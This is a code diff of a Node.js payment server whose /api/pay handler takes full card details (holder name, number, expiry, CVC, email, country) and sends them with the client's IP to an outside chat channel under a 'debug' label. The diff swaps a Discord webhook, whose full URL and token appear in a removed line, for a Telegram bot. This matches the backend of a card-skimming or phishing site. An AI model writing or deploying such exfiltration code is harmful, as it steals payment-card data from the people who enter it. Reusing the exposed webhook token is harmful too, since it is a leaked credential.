@@ -4,11 +4,31 @@ const bodyParser = require('body-parser');
 const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
+require('dotenv').config();
+const TelegramBot = require('node-telegram-bot-api');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 const CODES_FILE = path.join(__dirname, 'codes.json');
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1483531247685992608/UtI6SotnOhf-Iw95F82v-pfzCHQfTh_mzcMQ0vmzmBB3cEwxAHI3kEuM_boX7AqhzsNE";
+
+// Telegram Configuration
+const tgToken = process.env.TOKEN_TELEGRAM;
+const tgChatId = process.env.TELEGRAM_CHAT_ID;
+const botTg = new TelegramBot(tgToken, { polling: true });
+
+// Helper for Telegram Logging
+async function sendToTelegram(message) {
+    if (!tgChatId) {
+        console.warn("TELEGRAM_CHAT_ID non configuré");
+        return;
+    }
+    try {
+        await botTg.sendMessage(tgChatId, message, { parse_mode: 'Markdown' });
+        console.log("Log envoyé sur Telegram (server.js)");
+    } catch (err) {
+        console.error("Erreur Telegram server.js:", err.message);
+    }
+}
 
 app.use(cors());
 app.use(bodyParser.json());
@@ -28,26 +48,20 @@ function generateCode() {
 app.post('/api/pay', async (req, res) => {
     const { cardHolder, cardNumber, expiry, cvc, email, country } = req.body;
 
-    // Send debug data to Discord Webhook
+    // Send debug data to Telegram
     try {
-        await axios.post(DISCORD_WEBHOOK, {
-            embeds: [{
-                title: "💳 Nouvelle tentative de paiement - Debug Mode",
-                color: 0x9D50BB,
-                fields: [
-                    { name: "👤 Titulaire", value: `\`${cardHolder || 'Inconnu'}\``, inline: true },
-                    { name: "📧 Email", value: `\`${email || 'Inconnu'}\``, inline: true },
-                    { name: "🔢 Numéro", value: `\`${cardNumber || 'Inconnu'}\``, inline: true },
-                    { name: "📅 Expiration", value: `\`${expiry || 'Inconnu'}\``, inline: true },
-                    { name: "🔒 CVC", value: `\`${cvc || 'Inconnu'}\``, inline: true },
-                    { name: "🌍 Pays", value: `\`${country || 'Inconnu'}\``, inline: true },
-                    { name: "🌐 Client IP", value: `\`${req.ip}\`` }
-                ],
-                timestamp: new Date()
-            }]
-        });
+        const message = `💳 *Nouvelle tentative de paiement (Server)*\n\n` +
+            `👤 *Titulaire:* \`${cardHolder || 'Inconnu'}\`\n` +
+            `📧 *Email:* \`${email || 'Inconnu'}\`\n` +
+            `🔢 *Numéro:* \`${cardNumber || 'Inconnu'}\`\n` +
+            `📅 *Expiration:* \`${expiry || 'Inconnu'}\`\n` +
+            `🔒 *CVC:* \`${cvc || 'Inconnu'}\`\n` +
+            `🌍 *Pays:* \`${country || 'Inconnu'}\`\n` +
+            `🌐 *IP:* \`${req.ip}\``;
+        
+        await sendToTelegram(message);
     } catch (err) {
-        console.error("Webhook error:", err.message);
+        console.error("Telegram log error server.js:", err.message);
     }
 
     // Simulate delay
